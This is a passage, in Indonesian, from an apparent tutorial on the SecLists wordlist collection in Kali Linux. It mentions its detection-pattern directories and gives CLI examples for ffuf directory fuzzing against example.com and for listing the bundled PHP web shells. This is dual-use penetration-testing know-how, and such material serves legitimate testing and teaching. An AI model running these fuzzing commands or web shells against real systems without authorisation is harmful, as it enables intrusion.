* **Direktori `Miscellaneous` & `IOCs` (Pola Deteksi dan Forensik):** Menyertakan daftar indikator kompromi (*Indicators of Compromise*), ekspresi reguler (*regex*) untuk mendeteksi kebocoran kunci API (*API keys*) dalam kode sumber, serta data uji standar untuk analisis forensik dan Blue Team.

### 💻 Contoh Penggunaan CLI

```bash
# 1. Menelusuri direktori SecLists di Kali Linux
ls -la /usr/share/seclists/

# 2. Contoh penggunaan wordlist SecLists untuk fuzzing direktori web dengan FFUF
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://example.com/FUZZ

# 3. Mengakses koleksi web shell yang tersedia di SecLists
ls -la /usr/share/seclists/Web-Shells/PHP/
```

> 💡 **Kesimpulan:**
> Secara akademis, SecLists merepresentasikan kodifikasi pengetahuan empiris dari ribuan insiden keamanan dan riset kerentanan global ke dalam struktur data yang dapat direproduksi secara otomatis. Keberadaannya di Kali Linux menegaskan bahwa efektivitas pengujian keamanan otomatis sangat bergantung pada kualitas, relevansi, dan kelengkapan data uji yang digunakan untuk mengeksplorasi batas ketahanan suatu sistem informasi.
